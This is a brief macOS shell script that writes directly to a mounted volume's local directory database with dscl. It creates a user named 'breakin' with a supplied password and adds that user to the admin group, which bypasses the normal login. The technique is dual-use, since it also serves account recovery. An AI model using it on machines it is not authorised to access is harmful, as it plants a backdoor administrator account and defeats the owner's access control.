#!/bin/sh
VOLUMETARGET="Macintosh HD"
USERNAME="breakin"
PASSWORD=$1
USERID="101"
GROUPID="20"
DSCL_DB="/Volumes/$VOLUMETARGET/var/db/dslocal/nodes/Default"

echo "Adding user account."
dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME
dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME UserShell /bin/zsh
dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME RealName $USERNAME
dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME UniqueID $USERID
dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME PrimaryGroupID $GROUPID
dscl -f "$DSCL_DB" localonly -create /Local/Target/Users/$USERNAME NFSHomeDirectory /Users/$USERNAME
dscl -f "$DSCL_DB" localonly -passwd /Local/Target/Users/$USERNAME "$PASSWORD"
dscl -f "$DSCL_DB" localonly -append /Local/Target/Groups/admin GroupMembership $USERNAME
echo "Done."